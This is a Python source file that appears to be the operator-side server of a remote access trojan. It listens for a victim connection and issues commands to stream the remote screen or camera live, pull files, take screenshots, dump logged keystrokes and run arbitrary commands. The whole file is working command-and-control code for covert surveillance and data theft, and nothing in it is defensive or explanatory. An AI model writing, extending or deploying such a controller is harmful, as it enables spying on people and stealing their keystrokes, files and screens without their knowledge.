import socket
import struct
import cv2
import numpy as np
import threading

# Global to signal streaming stop from console input or window close
server_streaming_active = False
server_streaming_lock = threading.Lock()

def reliable_send(s, data):
    length = struct.pack('>I', len(data))
    s.sendall(length + data)

def reliable_recv(s):
    raw_len = recvall(s, 4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    return recvall(s, length)

def recvall(s, n):
    data = b''
    while len(data) < n:
        packet = s.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def server():
    host = '0.0.0.0'
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"Listening on {host}:{port}...")

    conn, addr = s.accept()
    print(f"Connection from {addr}")

    global server_streaming_active

    def receive_stream(connection):
        global server_streaming_active
        print("Stream receiving thread started.")
        cv2.namedWindow('Live Stream', cv2.WINDOW_NORMAL)
        while True:
            with server_streaming_lock:
                if not server_streaming_active:
                    print("Server_streaming_active is false, breaking loop.")
                    break
            try:
                frame_data = reliable_recv(connection)
                if frame_data is None:
                    print("No frame data received, possible client disconnection.")
                    with server_streaming_lock:
                        server_streaming_active = False
                    break

                np_arr = np.frombuffer(frame_data, np.uint8)
                frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)

                if frame is not None:
                    cv2.imshow('Live Stream', frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        with server_streaming_lock:
                            server_streaming_active = False
                        # Send stream_stop to client if 'q' is pressed on window
                        reliable_send(connection, b'stream_stop')
                        # Wait for client ack
                        ack = reliable_recv(connection)
                        print(f"Client ack for q-press stop: {ack.decode(errors='ignore') if ack else 'N/A'}")
                        break
                else:
                    print("Failed to decode frame.")
                    # Potentially signal error or stop streaming
                    # For now, we just continue, but this might indicate a problem
                    # with the data being sent or received.

            except Exception as e:
                print(f"Error receiving/displaying stream: {e}")
                with server_streaming_lock:
                    server_streaming_active = False
                break

        cv2.destroyAllWindows()
        print("Stream receiving thread finished and window closed.")


    stream_thread = None

    while True:
        command = input("Enter command: ")
        if command.strip() == '':
            continue

        if command == 'stream_start':
            with server_streaming_lock:
                if server_streaming_active:
                    print("Streaming is already active.")
                    continue
                server_streaming_active = True

            reliable_send(conn, command.encode()) # Send 'stream_start' to client
            response = reliable_recv(conn) # Wait for client confirmation
            print(f"Client: {response.decode(errors='ignore') if response else 'No response'}")

            if response and b"started" in response.lower():
                if stream_thread is None or not stream_thread.is_alive():
                    stream_thread = threading.Thread(target=receive_stream, args=(conn,), daemon=True)
                    stream_thread.start()
                else:
                    print("Stream thread issue: Already running?")
            else:
                print("Client did not start streaming or sent unexpected response.")
                with server_streaming_lock:
                    server_streaming_active = False # Reset flag if client failed to start
            continue # Skip generic response handling for this command

        elif command == 'stream_stop':
            with server_streaming_lock:
                if not server_streaming_active:
                    print("Streaming is not active.")
                    continue
                server_streaming_active = False # Signal thread to stop

            reliable_send(conn, command.encode()) # Send 'stream_stop' to client
            response = reliable_recv(conn) # Wait for client confirmation
            print(f"Client: {response.decode(errors='ignore') if response else 'No response'}")

            if stream_thread and stream_thread.is_alive():
                stream_thread.join(timeout=2) # Wait for thread to finish
            cv2.destroyAllWindows() # Ensure windows are closed
            print("Streaming stopped by command.")
            continue # Skip generic response handling

        # For other commands, send them and handle responses
        reliable_send(conn, command.encode())
        if command == 'exit':
            with server_streaming_lock: # Ensure streaming stops on exit
                server_streaming_active = False
            if stream_thread and stream_thread.is_alive():
                stream_thread.join(timeout=1)
            cv2.destroyAllWindows()
            break

        if command.startswith('download ') or command == 'screenshot' or command == 'keylog_dump':
            data = reliable_recv(conn)
            if data is None:
                print("Connection lost")
                with server_streaming_lock: server_streaming_active = False # Stop streaming if connection lost
                if stream_thread and stream_thread.is_alive(): stream_thread.join(timeout=1)
                cv2.destroyAllWindows()
                break
            if command.startswith('download '):
                filename = command[9:]
                with open('downloaded_' + filename, 'wb') as f:
                    f.write(data)
                print(f"File downloaded as downloaded_{filename}")
            elif command == 'screenshot':
                with open('screenshot.png', 'wb') as f:
                    f.write(data)
                print("Screenshot saved as screenshot.png")
            elif command == 'keylog_dump':
                print("Keylog data:")
                print(data.decode(errors='ignore'))
        else: # For commands like 'exec', 'upload' status, etc.
            data = reliable_recv(conn)
            if data is None:
                print("Connection lost")
                with server_streaming_lock: server_streaming_active = False # Stop streaming if connection lost
                if stream_thread and stream_thread.is_alive(): stream_thread.join(timeout=1)
                cv2.destroyAllWindows()
                break
            print(data.decode(errors='ignore'))

    conn.close()
    s.close()
    print("Server shutting down.")

if __name__ == '__main__':
    server()
